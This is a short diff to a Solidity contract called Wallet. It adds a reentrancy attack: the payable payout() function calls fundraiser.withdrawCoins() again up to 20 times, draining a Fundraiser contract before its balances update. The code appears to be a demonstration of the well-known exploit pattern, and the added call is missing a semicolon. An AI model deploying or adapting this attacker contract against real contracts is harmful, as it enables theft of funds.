@@ -1,6 +1,7 @@
 contract Wallet {
 
     Fundraiser fundraiser;
+    uint recursion = 20;
 
     function Wallet(address fundraiserAddress) {
         fundraiser = Fundraiser(fundraiserAddress);
@@ -19,6 +20,9 @@ contract Wallet {
     }
 
     function payout() payable {
+        if(recursion > 0) {
+            recursion--;
+            fundraiser.withdrawCoins()
         }
     }
 
